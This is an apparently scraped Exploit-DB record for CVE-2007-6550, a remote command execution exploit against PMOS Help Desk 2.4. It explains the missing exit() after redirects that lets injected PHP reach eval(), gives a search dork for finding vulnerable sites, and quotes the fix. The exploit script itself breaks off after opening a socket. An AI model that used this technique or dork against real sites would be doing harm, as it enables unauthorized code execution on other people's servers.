{
    "text": "ecve : CVE-2007-6550 ， title : PMOS Help Desk 2.4 - Remote Command Execution - PHP webapps Exploit ， verified : Verified ， exploit_detail : <?php ， / *  ， PMOS Help Desk <= 2.4 Remote Command Execution Exploit ， author... : EgiX ， mail..... : n0b0d13s [ at ] gmail [ dot ] com ， link..... :  ， dork..... : \"Powered by PMOS Help Desk\" ，  [ - ] PHP code injection through /form.php :  ， 28. if (  $ _SESSION [ login_type ] == $ LOGIN_INVALID )  ， 29. Header ( \"Location : { $ HD_URL_LOGIN}?redirect=\" . urlencode (  $ HD_CURPAGE )  )  ; <= == ， 30. ， 31. $ global_priv = get_row_count ( \"SELECT COUNT (  *  ) FROM { $ pre}privilege WHERE ( user_id = '{ $ _SESSION [ user ]  [ id ] }' dept_id = '0' ) \" )  ;  ， 32. if (  !  $ global_priv )  ， 33. Header ( \"Location :  $ HD_URL_BROWSE\" )  ; <= == ， 34. ， 35. $ options = array ( \"header\" , \"footer\" , \"logo\" , \"title\" ,  ( ... )  ， 36. ， 37. if (  $ _GET [ cmd ] == \"customdel\" )  ， 38. { ， 39. mysql_query ( \"DELETE FROM { $ pre}options WHERE ( id = '{ $ _GET [ id ] }' ) \" )  ;  ， 40. } ， 41. else if ( isset (  $ _POST [ header ]  )  )  ， 42. { ， 43. for (  $ i = 0 ;  $ i < count (  $ options )  ;  $ i++ )  ， 44. { ， 45. $ exists = get_row_count ( \"SELECT COUNT (  *  ) FROM { $ pre}options WHERE ( name = '{ $ options [  $ i ] }' ) \" )  ;  ， 46. if (  $ exists )  ， 47. mysql_query ( \"UPDATE { $ pre}options SET text = '\" . $ _POST [  $ options [  $ i ]  ] . \"' WHERE ( name = '{ $ options [  $ i ] }' ) \" )  ;  ， 48. else ， 49. mysql_query ( \"INSERT INTO { $ pre}options ( name , text ) VALUES ( '{ $ options [  $ i ] }' , '\" . $ _POST [  $ options [  $ i ]  ] . \"' ) \" )  ; <= == ， 50. } ， there isn't any exit (  ) or die (  ) function after header redirection at lines 29 , 33...so an attacker can inject php code into the 'options' ， table through the query at line 49 ( or 47 ) ...injected code will be executed by eval (  ) function located into some files...look at index.php :  ， 28. $ options = array ( \"header\" , \"footer\" , \"logo\" ,  ( ... )  ， 29. $ data = get_options (  $ options )  ;  ， 196. eval ( \"?> { $ data [ header ] } <?\" )  ; <= == ，  [ - ] Bug fix in /form.php :  ， 28. if (  $ _SESSION [ login_type ] == $ LOGIN_INVALID ) { ， 29. Header ( \"Location : { $ HD_URL_LOGIN}?redirect=\" . urlencode (  $ HD_CURPAGE )  )  ;  ， 30. exit (  )  ;  ， 31. } ， 32. ， 33. $ global_priv = get_row_count ( \"SELECT COUNT (  *  ) FROM { $ pre}privilege WHERE ( user_id = '{ $ _SESSION [ user ]  [ id ] }' dept_id = '0' ) \" )  ;  ， 34. if (  !  $ global_priv ) { ， 35. Header ( \"Location :  $ HD_URL_BROWSE\" )  ;  ， 36. exit (  )  ;  ， 37. } ，  * / ， error_reporting ( 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ， set_time_limit ( 0 )  ;  ，  $ sock = fsockopen (  $ host , 80 )  ; ",
    "time": "2007-12-25"
}